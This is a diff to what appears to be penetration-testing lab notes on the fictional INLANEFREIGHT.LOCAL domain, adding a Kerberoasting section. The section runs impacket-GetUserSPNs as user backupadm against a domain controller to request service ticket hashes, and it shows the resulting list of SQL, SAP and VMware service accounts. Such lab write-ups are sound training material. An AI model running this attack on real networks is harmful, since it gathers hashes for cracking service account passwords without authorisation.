@@ -1929,3 +1929,26 @@ distinguishedName: CN=vmwarescvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
 sAMAccountName: vmwarescvc
 
 ```
+
+## Kerberoasting
+
+```bash
+impacket-GetUserSPNs INLANEFREIGHT.LOCAL/backupadm -dc-ip 172.16.8.3 -request -outputfile spn.hash       
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName                         Name          MemberOf  PasswordLastSet             LastLogon                   Delegation 
+-------------------------------------------  ------------  --------  --------------------------  --------------------------  ----------
+adfsconnect/azure01.inlanefreight.local      azureconnect            2022-06-01 14:32:56.506935  <never>                                
+backupjob/veam001.inlanefreight.local        backupjob               2022-06-01 14:33:00.038178  <never>                                
+MSSQLSvc/DB01.inlanefreight.local:1433       mssqlsvc                2022-06-01 14:32:31.178803  <never>                                
+MSSQLSvc/DEVTEST.inlanefreight.local:1433    sqltest                 2022-06-01 14:32:45.522556  <never>                                
+MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                   2022-06-01 14:32:49.256932  <never>                                
+MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev                  2022-06-01 14:32:41.913173  <never>                                
+MSSQLSvc/SQL-WEB01.inlanefreight.local:1433  mssqladm                2022-06-01 14:32:52.897615  2022-06-23 00:45:20.688469             
+MSSQLSvc/SQL01.inlanefreight.local:1433      svc_sql                 2022-06-01 14:32:34.850677  <never>                                
+MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod                 2022-06-01 14:32:38.381946  <never>                                
+SAP/APP01.inlanefreight.local                sapsso                  2022-06-01 14:33:07.225672  <never>                                
+SAPsvc/SAP01.inlanefreight.local             sapvc                   2022-06-01 14:33:10.678799  <never>                                
+vmware/vc.inlanefreight.local                vmwarescvc              2022-06-01 14:33:03.600665  <never>  
+```
